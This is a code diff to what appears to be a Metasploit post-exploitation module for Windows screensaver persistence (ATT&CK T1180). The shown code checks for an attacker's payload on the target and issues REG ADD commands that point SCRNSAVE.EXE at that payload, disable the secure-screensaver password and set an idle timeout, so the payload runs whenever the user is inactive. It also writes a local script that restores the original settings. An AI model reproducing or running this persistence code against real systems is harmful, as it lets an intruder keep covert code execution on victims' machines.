@@ -243,6 +243,30 @@ def run
     print_status("Retriving default ScreenSaverIsSecure registry value data.")
     scrnsave_issecure = registry_getvaldata('HKCU\Control Panel\Desktop','ScreenSaverIsSecure')
     Rex::sleep(1.0)
+    print_status("Retriving default ScreenSaveActive registry value data.")
+    scrnsave_active = registry_getvaldata('HKCU\Control Panel\Desktop','ScreenSaveActive')
+    Rex::sleep(1.0)
+
+
+    #
+    # create revert resource file [local PC]
+    #
+    rand = Rex::Text.rand_text_alpha(5)
+    print_good("Writing revert_#{rand}.rc resource file (local).")
+    Rex::sleep(1.0)
+      loot_folder = datastore['LOOT_FOLDER'] # /root/.msf4/loot
+      File.open("#{loot_folder}/revert_#{rand}.rc", "w") do |f|
+        f.write("###\n")
+        f.write("## SCRNSAVE mitre ATT&CK T1180 - revert to default script.\n")
+        f.write("## Computer: #{sysnfo['Computer']} | Payload: #{app_path}\n")
+        f.write("## To revert hack execute in a meterpreter prompt: resource #{loot_folder}/revert_#{rand}.rc\n")
+        f.write("###\n")
+        f.write("reg setval -k \"HKCU\\Control Panel\\Desktop\" -v ScreenSaveActive -t REG_SZ -d #{scrnsave_active}\n")
+        f.write("reg setval -k \"HKCU\\Control Panel\\Desktop\" -v ScreenSaverIsSecure -t REG_SZ -d #{scrnsave_issecure}\n")
+        f.write("reg setval -k \"HKCU\\Control Panel\\Desktop\" -v ScreenSaveTimeOut -t REG_SZ -d #{scrnsave_timeout}\n")
+        f.write("reg setval -k \"HKCU\\Control Panel\\Desktop\" -v SCRNSAVE.EXE -t REG_SZ -d #{scrnsave_data}\n")
+        f.close
+      end
 
 
       #
@@ -250,7 +274,7 @@ def run
       #
       print_status("checking for #{app_path} presence.")
       if session.fs.file.exist?(app_path)
-        print_good("Remote PE/Application (payload) found on target system.")
+        print_good("Remote PE/Application found on target system.")
       else
         print_error("NOT FOUND: #{app_path}")
         print_warning("Deploy your [payload] before using this module.")
@@ -267,8 +291,8 @@ def run
         Rex::sleep(1.0)
           hacks = [
             "REG ADD \"HKCU\\Control Panel\\Desktop\" /v ScreenSaveActive /t REG_SZ /d 1 /f",
-            "REG ADD \"HKCU\\Control Panel\\Desktop\" /v ScreenSaverIsSecure /t REG_SZ /d 0 /f",
             "REG ADD \"HKCU\\Control Panel\\Desktop\" /v ScreenSaveTimeOut /t REG_SZ /d #{time_out} /f",
+            "REG ADD \"HKCU\\Control Panel\\Desktop\" /v ScreenSaverIsSecure /t REG_SZ /d 0 /f",
             "REG ADD \"HKCU\\Control Panel\\Desktop\" /v SCRNSAVE.EXE /t REG_SZ /d #{app_path} /f"
           ]
 
@@ -299,38 +323,15 @@ def run
 
 
        #
-       # create revert resource file [local PC]
-       #
-       rand = Rex::Text.rand_text_alpha(5)
-       print_status("Writing revert_#{rand}.rc resource file (local).")
-       Rex::sleep(1.0)
-         loot_folder = datastore['LOOT_FOLDER'] # /root/.msf4/loot
-         File.open("#{loot_folder}/revert_#{rand}.rc", "w") do |f|
-           f.write("###\n")
-           f.write("## SCRNSAVE mitre ATT&CK T1180 - revert to default script.\n")
-           f.write("## Computer: #{sysnfo['Computer']} | Payload: #{app_path}\n")
-           f.write("## To revert hack execute in a meterpreter prompt: resource #{loot_folder}/revert_#{rand}.rc\n")
-           f.write("###\n")
-           f.write("reg setval -k \"HKCU\\Control Panel\\Desktop\" -v ScreenSaveActive -t REG_SZ -d 1\n")
-           f.write("reg setval -k \"HKCU\\Control Panel\\Desktop\" -v ScreenSaverIsSecure -t REG_SZ -d #{scrnsave_issecure}\n")
-           f.write("reg setval -k \"HKCU\\Control Panel\\Desktop\" -v ScreenSaveTimeOut -t REG_SZ -d #{scrnsave_timeout}\n")
-           f.write("reg setval -k \"HKCU\\Control Panel\\Desktop\" -v SCRNSAVE.EXE -t REG_SZ -d #{scrnsave_data}\n")
-           f.close
-         end
-
-
-       #
        # exploit finished (print info onscreen)
        #
        Rex::sleep(1.0)
        print_line("---------------------------------------------------")
        print_line("Malicious PE/App : #{app_path}")
        print_line("Trigger exploit  : every #{time_out} sec (if inactive)")
-       print_line("Revert script    : #{loot_folder}/revert_#{rand}.rc")
+       print_line("Revert script    : resource #{loot_folder}/revert_#{rand}.rc")
        print_line("---------------------------------------------------")
-       print_warning("execute meterpreter > resource #{loot_folder}/revert_#{rand}.rc")
        Rex::sleep(1.5)
-
 
 
      #
